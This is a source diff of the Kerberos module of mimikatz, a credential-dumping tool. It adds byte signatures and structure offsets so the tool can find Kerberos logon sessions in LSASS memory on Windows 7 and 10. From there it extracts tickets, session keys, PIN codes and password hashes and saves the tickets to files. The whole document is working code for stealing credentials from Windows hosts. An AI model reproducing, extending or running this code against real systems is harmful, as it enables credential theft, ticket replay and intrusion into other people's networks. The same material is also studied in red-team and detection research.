@@ -11,16 +11,21 @@ KULL_M_PATCH_GENERIC KerberosReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 2}},
+	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 3}},
+	{KULL_M_WIN_BUILD_10b,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 4}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0xeb, 0x0f, 0x6a, 0x01, 0x57, 0x56, 0xe8};
 BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x53, 0x8b, 0x18, 0x50, 0x56};
 BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x57, 0x8b, 0x38, 0x50, 0x68};
+BYTE PTRN_WI10_KerbUnloadLogonSessionTable[]= {0x56, 0x8b, 0x30, 0x50, 0x57};
 KULL_M_PATCH_GENERIC KerberosReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,2}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,2}},
+	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,3}},
+	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,3}},
+	{KULL_M_WIN_BUILD_10b,		{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,4}},
 };
 #endif
 
@@ -102,6 +107,38 @@ const KERB_INFOS kerbHelper[] = {
 		},
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
 		sizeof(KIWI_KERBEROS_LOGON_SESSION),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, ServiceName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TargetName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, DomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TargetDomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, Description),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, AltTargetDomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, ClientName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TicketFlags),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, KeyType),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, Key),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, StartTime),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, EndTime),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, RenewUntil),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TicketEncType),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, Ticket),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_60, TicketKvno),
+		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_60),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
+		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
+		sizeof(KERB_HASHPASSWORD_6),
+	},
+	{
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
+		{
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
+		},
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
+		sizeof(KIWI_KERBEROS_LOGON_SESSION),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, DomainName),
@@ -120,6 +157,38 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketKvno),
 		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_6),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
+		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
+		sizeof(KERB_HASHPASSWORD_6),
+	},
+	{
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials),
+		{
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_1),
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_2),
+			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, Tickets_3),
+		},
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, pinCode),
+		sizeof(KIWI_KERBEROS_LOGON_SESSION_10),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, DomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetDomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Description),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, AltTargetDomainName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ClientName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketFlags),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, KeyType),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Key),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, StartTime),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, EndTime),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, RenewUntil),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketEncType),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Ticket),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketKvno),
+		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_6),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, pKeyList),
 		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
 		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
 		sizeof(KERB_HASHPASSWORD_6),
@@ -350,7 +419,7 @@ void kuhl_m_sekurlsa_enum_generic_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGO
 			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
 		else
 			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
-		
+
 		if(aLsassMemory.address)
 		{
 			if(aLocalMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
@@ -391,7 +460,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 						if(isFile)
 							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
 							{
-								if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket))
+								if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket, FALSE))
 								{
 									if(kull_m_file_writeData(filename, (PBYTE) App_KrbCred, kull_m_asn1_getSize(App_KrbCred)))
 										kprintf(L"\n\t   * Saved to file %s !", filename);
@@ -401,7 +470,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 								LocalFree(filename);
 							}
 
-						kuhl_m_sekurlsa_kerberos_freeTicket(pKiwiTicket);
+						kuhl_m_kerberos_ticket_freeTicket(pKiwiTicket);
 					}
 					data.address = ((PLIST_ENTRY) (aTicket.address))->Flink;
 				}
@@ -417,7 +486,7 @@ wchar_t * kuhl_m_sekurlsa_kerberos_generateFileName(PLUID LogonId, const DWORD g
 {
 	wchar_t * buffer;
 	size_t charCount = 0x1000;
-	BOOL isLong = (ticket->ClientName) && (ticket->ClientName->NameType == KRB_NT_PRINCIPAL) && (ticket->ClientName->NameCount == 1) && (ticket->ServiceName) && ((ticket->ServiceName->NameType == KRB_NT_SRV_INST) || (ticket->ServiceName->NameType == KRB_NT_SRV_HST)) && (ticket->ServiceName->NameCount > 1);
+	BOOL isLong = kuhl_m_kerberos_ticket_isLongFilename(ticket);
 
 	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
 	{
@@ -518,38 +587,4 @@ void kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBu
 			kull_m_memory_copy(&aLocalBuffer, &aBuffer, pBuffer->Length);
 		}
 	}
-}
-
-void kuhl_m_sekurlsa_kerberos_freeTicket(PKIWI_KERBEROS_TICKET ticket)
-{
-	if(ticket)
-	{
-		kuhl_m_sekurlsa_kerberos_freeExternalName(ticket->ServiceName);
-		kull_m_string_freeUnicodeStringBuffer(&ticket->DomainName);
-		kuhl_m_sekurlsa_kerberos_freeExternalName(ticket->TargetName);
-		kull_m_string_freeUnicodeStringBuffer(&ticket->TargetDomainName);
-		kuhl_m_sekurlsa_kerberos_freeExternalName(ticket->ClientName);
-		kull_m_string_freeUnicodeStringBuffer(&ticket->AltTargetDomainName);
-		kull_m_string_freeUnicodeStringBuffer(&ticket->Description);
-		kuhl_m_sekurlsa_kerberos_freeKiwiKerberosBuffer(&ticket->Key);
-		kuhl_m_sekurlsa_kerberos_freeKiwiKerberosBuffer(&ticket->Ticket);
-		LocalFree(ticket);
-	}
-}
-
-void kuhl_m_sekurlsa_kerberos_freeExternalName(PKERB_EXTERNAL_NAME pName)
-{
-	DWORD i;
-	if(pName)
-	{
-		for(i = 0; i < pName->NameCount; i++)
-			kull_m_string_freeUnicodeStringBuffer(&pName->Names[i]);
-		LocalFree(pName);
-	}
-}
-
-void kuhl_m_sekurlsa_kerberos_freeKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBuffer)
-{
-	if(pBuffer->Value)
-		LocalFree(pBuffer->Value);
 }
